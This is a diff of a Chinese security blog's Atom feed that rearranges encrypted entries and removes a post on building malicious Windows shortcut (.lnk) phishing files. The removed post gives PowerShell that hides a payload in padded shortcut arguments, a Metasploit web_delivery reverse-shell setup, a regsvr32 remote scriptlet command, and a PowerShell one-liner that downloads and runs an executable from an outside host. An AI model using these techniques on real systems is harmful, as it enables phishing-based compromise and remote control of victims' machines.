@@ -40,6 +40,27 @@
   </entry>
   
   <entry>
+    <title>日常记录</title>
+    <link href="http://mysecroad.github.io/posts/42951.html"/>
+    <id>http://mysecroad.github.io/posts/42951.html</id>
+    <published>2099-12-31T15:59:59.000Z</published>
+    <updated>2020-04-25T03:09:14.919Z</updated>
+    
+    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="f4f25515922814b31789af777e8cc081f949bd50de753aaf64e1e2b4b1866cac">8de2c04a2d70dba63f65a56a98175f4a</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+    
+    <summary type="html">
+    
+      输入密码，查看文章！
+    
+    </summary>
+    
+    
+      <category term="总结" scheme="http://mysecroad.github.io/categories/%E6%80%BB%E7%BB%93/"/>
+    
+    
+  </entry>
+  
+  <entry>
     <title>易错知识</title>
     <link href="http://mysecroad.github.io/posts/34260.html"/>
     <id>http://mysecroad.github.io/posts/34260.html</id>
@@ -59,13 +80,13 @@
   </entry>
   
   <entry>
-    <title>日常记录</title>
-    <link href="http://mysecroad.github.io/posts/42951.html"/>
-    <id>http://mysecroad.github.io/posts/42951.html</id>
-    <published>2099-12-31T15:59:59.000Z</published>
-    <updated>2020-04-25T03:09:14.919Z</updated>
+    <title>常用工具列表</title>
+    <link href="http://mysecroad.github.io/posts/51461.html"/>
+    <id>http://mysecroad.github.io/posts/51461.html</id>
+    <published>2020-05-05T10:41:19.000Z</published>
+    <updated>2020-05-05T12:42:40.835Z</updated>
     
-    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="f4f25515922814b31789af777e8cc081f949bd50de753aaf64e1e2b4b1866cac">8de2c04a2d70dba63f65a56a98175f4a</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="3c0429e574063d01da93f1a4061ded3d0dca8f2f96013c2fde35aadd6b08d303">91a94175a3ddae5441ba2bd65b108e9dd18758429498f7a05073765c063040b645abbf357bcc87b24a6860e2e7ce9def95a3cee4c1a9533a279f8ca8ce700d1d81367c3c63bdd9bcd6dbd3ba3db31316afaa8dbba23c64c46e8c6e03462e2ca7d27e603e9a27db12c4bee187e81f8b454ca4ec5a46a2a57052aa7cc4989935964f27740bad7feaeecd275f02747c70d793702e30e69d1eb9ea7f363e58fe62dcd54670beb5752b5ed302e5b61043a855630b94da314153bc68bb769d5102ba93557a243d64ef666278807283cb02d7dcb8b6969e885bf92252075b5206b3f14392d952b9c810f9193bf1b446d7a1bc0cd07185af526657b08a935d8076a1e820b733c6138f43a6ae3caa98df47fb5eb34348ab72d102cf8e76fd47d123cac664b42f361a89bfadab1f382ab6f78478dc3e41a35b5b9029403e81fe61d12c6b46e08f4e62417fdc42e34eda337b838c582a203aa1b62dc998e418b28bdff874c27f21d8abc7ca819088eecee7a717dc36eaeb57c5ee9eab80712210ba5d7d151b8168ad7b55d20ec3cb5f9f4dadf3cc5d7b2fd7ec52a299b28661e2339ce2297d77ba6e14e41ac48679abf961e85b17c8</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
     
     <summary type="html">
     
@@ -74,8 +95,10 @@
     </summary>
     
     
-      <category term="总结" scheme="http://mysecroad.github.io/categories/%E6%80%BB%E7%BB%93/"/>
+      <category term="Tools" scheme="http://mysecroad.github.io/categories/Tools/"/>
     
+    
+      <category term="Tools" scheme="http://mysecroad.github.io/tags/Tools/"/>
     
   </entry>
   
@@ -470,28 +493,6 @@
     
     
       <category term="内网渗透" scheme="http://mysecroad.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>构造windows快捷方式钓鱼信</title>
-    <link href="http://mysecroad.github.io/posts/44104.html"/>
-    <id>http://mysecroad.github.io/posts/44104.html</id>
-    <published>2019-11-09T06:22:36.000Z</published>
-    <updated>2020-04-26T13:38:23.771Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>关于windows快捷方式,想必这里就不用再多说了,大家应该已经非常了解才是,说白点,它其实就是一种路径映射而已,而我们利用的也正是这种特性,触发细节很简单,这里不妨简单回顾下,当我们双击打开一个windows快捷方式时内部到底都发生了些什么,首先,windows会根据快捷方式中指定的路径去触发执行相应的程序,假如我们指向的是一个包含恶意的payload路径,那结果就可想而知,payload肯定会被正常执行</p><h2 id="0x01-生成快捷方式"><a href="#0x01-生成快捷方式" class="headerlink" title="0x01 生成快捷方式"></a>0x01 生成快捷方式</h2><p>新建 test.txt 文件，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd &#x2F;c calc</span><br></pre></td></tr></table></figure><p>新建 test.ps1 文件，右键powershell运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$file &#x3D; Get-Content &quot;test.txt&quot;</span><br><span class="line">$WshShell &#x3D; New-Object -comObject WScript.Shell</span><br><span class="line">$Shortcut &#x3D; $WshShell.CreateShortcut(&quot;test.lnk&quot;)</span><br><span class="line">$Shortcut.TargetPath &#x3D; &quot;%SystemRoot%\system32\cmd.exe&quot;</span><br><span class="line">$Shortcut.IconLocation &#x3D; &quot;%SystemRoot%\System32\Shell32.dll,21&quot;</span><br><span class="line">$Shortcut.Arguments &#x3D; &#39;                                                                                                                                                                                                                                    &#39;+ $file</span><br><span class="line">$Shortcut.Save()</span><br></pre></td></tr></table></figure><p>生成 test.lnk 文件，而且图标改了（powershell执行文件要和test.txt要在一个目录下，这个图标所在位置就在%SystemRoot%\System32\Shell32.dll目录下）</p><p>双击 test.lnk ，调用计算器<br><img src="/posts/44104/1.png" alt></p><h2 id="0x02-借助windows快捷方式实现beacon上线"><a href="#0x02-借助windows快捷方式实现beacon上线" class="headerlink" title="0x02 借助windows快捷方式实现beacon上线"></a>0x02 借助windows快捷方式实现beacon上线</h2><p>先创建一个powershell的payload</p><p>Attacks –&gt; Packages –&gt; payload Generator<br><img src="/posts/44104/2.png" alt></p><p>将生成的代码替换掉 calc，运行 test.ps1，生成 test.lnk<br>双击 test.lnk，反弹shell<br><img src="/posts/44104/3.png" alt></p><h2 id="0x02-借助windows快捷方式实现meterpreter上线"><a href="#0x02-借助windows快捷方式实现meterpreter上线" class="headerlink" title="0x02 借助windows快捷方式实现meterpreter上线"></a>0x02 借助windows快捷方式实现meterpreter上线</h2><p>先用msf去生成payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery </span><br><span class="line">msf &gt; set target  3</span><br><span class="line">msf &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp_rc4_dns </span><br><span class="line">msf &gt; set lhost 192.168.3.29</span><br><span class="line">msf &gt; set lport 82</span><br><span class="line">msf &gt; set rc4password  klionsec</span><br><span class="line">msf exploit(multi&#x2F;script&#x2F;web_delivery) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.3.29:82 </span><br><span class="line">msf exploit(multi&#x2F;script&#x2F;web_delivery) &gt; [*] Using URL: http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;qQJvcDScrbA</span><br><span class="line">[*] Local IP: http:&#x2F;&#x2F;192.168.3.29:8080&#x2F;qQJvcDScrbA</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.3.29:8080&#x2F;qQJvcDScrbA.sct scrobj.dll将此命令单独写到meter.txt文件中去生成快捷方式</span><br></pre></td></tr></table></figure><p>生成快捷方式，双击执行</p><h2 id="0x03-借助windows快捷方式实现自定义木马上线"><a href="#0x03-借助windows快捷方式实现自定义木马上线" class="headerlink" title="0x03 借助windows快捷方式实现自定义木马上线"></a>0x03 借助windows快捷方式实现自定义木马上线</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe (New-Object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.72.23&#x2F;&#x2F;PsExec.exe&#39;,&#39;c:\\temp\\PsExec.exe&#39;);(New-Object -com Shell.Application).ShellExecute(&#39;c:\\temp\\PsExec.exe&#39;)</span><br></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;关于windows快捷方式,想必这里就不用再多说了,大家应该已经非常了解才是,说白点,它其实就是一种
-      
-    
-    </summary>
-    
-    
     
   </entry>
   
